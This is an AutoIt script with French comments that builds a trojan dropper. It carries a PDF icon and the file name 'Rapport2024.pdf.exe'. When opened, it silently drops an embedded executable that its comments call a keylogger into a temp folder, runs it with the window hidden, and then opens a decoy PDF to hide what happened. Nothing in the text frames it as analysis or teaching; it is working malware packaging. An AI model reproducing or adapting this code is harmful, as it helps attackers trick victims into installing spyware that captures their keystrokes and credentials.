#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=pdf_icon.ico
#AutoIt3Wrapper_Outfile=Rapport2024.pdf.exe
#AutoIt3Wrapper_Compression=4
#AutoIt3Wrapper_UseUpx=y
#EndRegion

; Masquer la fenêtre
Opt("TrayIconHide", 1)

; Créer un dossier temporaire
Local $tempDir = @TempDir & "\docs"
DirCreate($tempDir)

; IMPORTANT: Utiliser le bon nom d'exécutable
FileInstall("dist\WindowsService.exe", $tempDir & "\WindowsService.exe", 1)  ; Chemin vers l'exe dans le dossier dist
FileInstall("document.pdf", $tempDir & "\document.pdf", 1)

; Lancer le keylogger
Run($tempDir & "\WindowsService.exe", "", @SW_HIDE)
Sleep(1000) ; Attendre un peu

; Ouvrir le PDF
ShellExecute($tempDir & "\document.pdf")